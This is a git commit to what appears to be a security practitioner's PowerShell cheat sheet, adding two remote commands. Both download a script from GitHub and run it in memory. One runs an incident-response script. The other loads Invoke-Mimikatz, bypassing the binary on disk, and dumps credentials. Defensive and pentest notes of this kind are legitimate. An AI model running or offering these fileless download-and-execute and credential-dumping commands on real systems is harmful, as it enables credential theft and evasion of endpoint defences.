84ccaadd10a5dd6ec6cfb337baba0fc3d8c37e22
Jimmi <b1nary0mega@users.noreply.github.com>
2019-09-17 15:29:41 -0400

    Update powershell.ps1
    added snippet to pull code from web

--- powershell.ps1
+++ powershell.ps1
@@ -14,3 +14,9 @@ PS > Get-Command | Where {$_.Name -like "*write*"}
 
 # rename all files BASE and keep EXTENSION (-WhatIf == see what would happen; remove to actually perform)
 PS > Get-ChildItem -Path .\ | Rename-Item -NewName {$_.Basename.Replace("old_name","new_name") + $_.extension} -WhatIf -Verbose
+
+# download and execute JCERT.PS1
+PS > Invoke-Command MACHINE_NAME {iex((New-Object Net.WebClient).DownloadString('https://github.com/b1nary0mega/incident-response/raw/master/JCERT.ps1')); JCERT.ps1}
+
+# ***CAUTION*** load mimikatz into memory; completely bypassing binary on disk
+PS > Invoke-Command MACHINE_NAME {iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')); Invoke-Mimikatz -DumpCreds}
